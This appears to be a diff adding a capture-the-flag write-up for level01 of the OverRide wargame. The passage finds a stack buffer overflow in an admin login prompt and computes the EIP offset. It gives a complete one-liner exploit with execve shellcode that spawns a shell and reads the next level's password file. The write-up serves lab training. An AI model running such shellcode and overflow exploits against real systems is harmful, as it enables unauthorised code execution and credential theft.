@@ -106,3 +106,66 @@ gdb-peda$ disass verify_user_pass
 gdb-peda$ x/s 0x80486b0
 0x80486b0:	 "admin"
 ```
+But use of retrieved credentials, username `dat_wil` and password `admin`, do not allow anything and the program returns 1 with error message `nope, incorrect password...`.
+```nasm
+   0x08048589 <+185>:   cmp    DWORD PTR [esp+0x5c],0x0
+   0x0804858e <+190>:   je     0x8048597 <main+199>
+   0x08048590 <+192>:   cmp    DWORD PTR [esp+0x5c],0x0
+   0x08048595 <+197>:   je     0x80485aa <main+218>
+```
+```shell
+level01@OverRide:~$ ./level01; echo $?
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+admin
+nope, incorrect password...
+
+1
+```
+`fgets()` reads in at most one less than 100 bytes from `stdin` and stores the input into the 64-bytes buffer `user_pass`. Which is 36 bytes more than allocated buffer. It means that `user_pass` variable can be overflowed and the value of `EIP` can be overwritten.
+```nams
+   0x0804855c <+140>:   mov    eax,ds:0x804a020          // eax = stdin
+=> 0x08048561 <+145>:   mov    DWORD PTR [esp+0x8],eax   // stdin);
+   0x08048565 <+149>:   mov    DWORD PTR [esp+0x4],0x64  // 100, stdin);
+   0x0804856d <+157>:   lea    eax,[esp+0x1c]            // eax = user_pass
+   0x08048571 <+161>:   mov    DWORD PTR [esp],eax       // user_pass, 100, stdin);
+   0x08048574 <+164>:   call   0x8048370 <fgets@plt>     // fgets(user_pass, 100, stdin);
+```
+
+To find offset, generate a string of 100 bytes legth using (BOEIPOSG)[https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/).
+```nasm
+(gdb) start
+Temporary breakpoint 1 at 0x80484d5
+Starting program: /home/users/level01/level01
+
+Temporary breakpoint 1, 0x080484d5 in main ()
+(gdb) c
+Continuing.
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+```
+Program exit on `EIP` value 0x37634136 which gives offset of 80 bytes.
+
+As `a_user_name` is defined with 100 bytes, a shell code can be placed after `dat_wil` and EIP overwritten to `a_user_name+7`.
+```shell
+level01@OverRide:~$ (python -c "import struct; print('dat_wil\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\n' + 'A'*80 + struct.pack('I', 0x0804a047))"; echo 'cat /home/users/$(whoami)/.pass') | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
